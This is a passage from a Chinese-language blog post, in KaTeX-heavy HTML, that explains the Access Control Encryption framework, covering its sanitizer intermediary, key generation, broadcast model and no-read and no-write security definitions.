mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>权限，底层权限的人对来自于高层权限的信息是无法接受的（或者读不懂），而高层权限无法向底层权限的人发送信息（不能写）。也就是信息流被控制只能从底层传向高层。</p>
<h2 id="实现前提"><a class="markdownIt-Anchor" href="#实现前提"></a> 实现前提</h2>
<p>首先便是该思想能够成功实现的假设：信息流是被控制的！所有的用户之间信息的传递都需要经过中间人的传递来实现（类似于网关的存在），否则的话信息可以随便发送便没有了该文章的意义，因此引入了装置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi>r</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Sanitizer\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>(简称<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">San\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>)来控制信息流，现在只需要<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>​知道方案然后根据方案来判别发送者和接收者，将不合法的信息拦截即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210730152440.png" alt="初始框架" /></p>
<p>问题出现：</p>
<blockquote>
<p>(1)用户发送信息时声明自己的身份，如何确保用户正确的声明了身份呢？</p>
<p>(2)San装置知道了太多的东西，对于用户组内部，修改密文或者对消息拦截与否不能保证（San作为中间人叛变？)</p>
<p>(3)San的功能无法外包出去。</p>
</blockquote>
<p>接下来如何简化<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>的功能使其知道尽可能少的信息？明确一点：</p>
<blockquote>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>必须对发过来的消息进行处理，比如如果一个叛变的发送者不介意把消息告诉任何人，他丧心病狂的直接发送把明文发送出去，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>不做任何处理，这样所有人都能够知道明文消息了！我们暂且将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>对消息的处理称为随机化或者“消毒”吧。</p>
</blockquote>
<p>因此要求消毒处理不依赖于安全方案和发送接收方的身份，这样的话他就只需要知道消息的发送时间和消息长度即可，这样<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>​也能够外包出去。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210730154911.png" alt="简化后的San" /></p>
<h2 id="工作模式"><a class="markdownIt-Anchor" href="#工作模式"></a> 工作模式</h2>
<p>一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>C</mi><mi>E</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">ACE\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>框架包括：</p>
<blockquote>
<p>(1)密钥生成算法：生成一系列的发送者密钥（类似于公钥）、接受者密钥（类似于私钥）和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi>r</mi><mtext>  </mtext><mi>K</mi><mi>e</mi><mi>y</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Sanitizer\;Key\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>（用于消毒处理）。</p>
<p>(2)发送者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;S\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>使用他的加密密钥对明文进行加密，发送给<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>后进行随机化处理，处理后的消息被广播出去（因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>不知道接收者是谁）。</p>
</blockquote>
<p>在上述前提下：两个不允许通信的人如果进行通信，由于接收者不知道解密密钥且消息经过了随机化处理，他是无法复现出明文的。</p>
<h2 id="安全性定义"><a class="markdownIt-Anchor" href="#安全性定义"></a> 安全性定义</h2>
<p>首先声明：</p>
<blockquote>
<p>(1)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>r</mi><mi>s</mi><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><mi>R</mi><mi>e</mi><mi>c</mi><mi>e</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Senders\;and\;Receivers\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>：发送者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>S</mi><mi>n</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">S_1,...,S_n\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>和接收者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>R</mi><mi>n</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">R_1,...,R_n\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，对于发送者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">S_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>和接收者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">R_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>之间，二者是否能够沟通信取决于矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>:</mo><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>×</mo><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>→</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">P:[n]\times[n]\rightarrow\{0,1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i,j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>的值进行判断。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">P(i,j)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>便是二者不能够进行通信。</p>
<p>(2)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mi>e</mi><mi>t</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>k</mi><mtext>  </mtext><mi>M</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Network\;Model\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>：发送者发送的密文消息可以被所有接收者看见，只有一个公共的信道进行传输。一个发送者不能够单独将消息只发送给特殊的接收者。</p>
</blockquote>
<p>接下来安全性的定义如下：</p>
<blockquote>
<p>(1)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>n</mi><mi>e</mi><mi>s</mi><mi>s</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">Correctness:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>发送者发送出去的消息，所以要满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">P(i,j)=1\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>的接收者都能够复现出明文。</p>
<p>(2)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mi>o</mi><mo>−</mo><mi>R</mi><mi>e</mi><mi>a</mi><mi>d</mi><mtext>  </mtext><mi>R</mi><mi>u</mi><mi>l</mi><mi>e</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">No-Read\;Rule:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">P(i,j)=0\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>​的所有用户都不能够得到关于明文的任何信息。</p>
<blockquote>
<p>(2b)中间者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>不能知道发送的消息明文和发送者的身份以防止中间者叛变。</p>
</blockquote>
<p>(3)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mi>o</mi><mo>−</mo><mi>W</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>e</mi><mtext>  </mtext><mi>R</mi><mi>u</mi><mi>l</mi><mi>e</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">No-Write\;Rule:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">o</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">P(i,j)=0\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，那么任何发送者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">S_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>都不应该与接收者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">R_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>交流任何信息。</p>
</blockquote>
